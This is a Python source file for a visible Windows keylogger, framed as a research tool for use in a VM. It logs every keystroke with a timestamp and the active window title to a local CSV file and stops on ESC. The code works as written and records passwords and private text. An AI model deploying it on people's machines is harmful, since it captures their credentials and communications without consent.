import csv
import os
from datetime import datetime
from pynput import keyboard
import win32gui
import win32process
import psutil

class ResearchKeylogger:
    """
    A user-space keylogger for Windows.
    
    This tool logs keystrokes alongside the active window title to a CSV file.
    It is intended to be run in a VM.
    """

    def __init__(self, log_file="keystroke_log.csv"):
        """
        Initializes the keylogger.
        
        Args:
            log_file (str): Path to the CSV file where keystrokes will be logged.
        """
        self.log_file = log_file
        self.current_window = None
        self.listener = None
        self._init_log_file()

    def _init_log_file(self):
        """creates the CSV log file and writes the header row"""
        if not os.path.exists(self.log_file):
            with open(self.log_file, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(["timestamp", "window", "key"])

    def get_active_window(self):
        """
        Gets the title of the currently active window.
        
        Returns:
            str: The title of the active window, or 'Unknown' if it cannot be retrieved.
        """
        try:
            window = win32gui.GetForegroundWindow()
            window_title = win32gui.GetWindowText(window)
            # so we can get process name for deeper analysis (future use)
            # _, pid = win32process.GetWindowThreadProcessId(window)
            # process = psutil.Process(pid)
            # process_name = process.name()
            # return "{window_title} [{process_name}]"
            return window_title if window_title else "Unknown"
        except Exception:
            return "Unknown"

    def on_press(self, key):
        """
        Callback function whenever a key is pressed.
        
        Args:
            key: The key event from pynput.
        """
        new_window = self.get_active_window()
        if new_window != self.current_window:
            self.current_window = new_window

        try:
            #for character keys, log the character directly
            logged_key = key.char
        except AttributeError:
            #for special keys (e.g., space, enter, shift), log their name
            logged_key = f'[{key.name}]'

        self.log_keystroke(logged_key)

    def log_keystroke(self, key):
        """
        writes a keystroke entry to the CSV log file.
        
        Args:
            key (str): The key that was pressed.
        """
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        with open(self.log_file, 'a', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow([timestamp, self.current_window, key])

    def start(self):
        """starts the keylogger listener."""
        print("[INFO] Research Keylogger started. Logging to:", self.log_file)
        print("[INFO] Press ESC to stop.")
        with keyboard.Listener(on_press=self.on_press) as self.listener:
            #set up a separate listener to catch the ESC key for stopping
            def on_release(key):
                if key == keyboard.Key.esc:
                    #stoppin the main listener
                    return False
            with keyboard.Listener(on_release=on_release) as escape_listener:
                escape_listener.join()
        print("[INFO] Research Keylogger stopped.")

if __name__ == "__main__":
    #start the keylogger
    keylogger = ResearchKeylogger()
    keylogger.start()
